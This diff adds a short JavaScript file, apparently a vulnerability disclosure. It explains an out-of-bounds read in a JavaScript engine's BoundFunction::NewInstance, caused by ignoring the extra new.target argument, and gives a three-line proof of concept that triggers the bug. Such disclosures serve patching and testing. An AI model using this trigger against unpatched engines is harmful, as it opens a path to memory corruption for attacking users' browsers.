@@ -1,0 +1,13 @@
+/*
+BoundFunction::NewInstance is used to handle calls to a bound function. The method first allocates a new argument array and copies the prepended arguments and others into the new argument array and calls the actual function. The problem is, it doesn't care about the CallFlags_ExtraArg flag which indicates that there's an extra argument (new.target in the PoC) at the end of the argument array. So the size of the new argument array created with the CallFlags_ExtraArg flag will be always 1 less then required, this leads to an OOB read.
+
+PoC:
+*/
+
+function func() {
+    new.target.x;
+}
+
+let bound = func.bind({}, 1);
+
+Reflect.construct(bound, []);
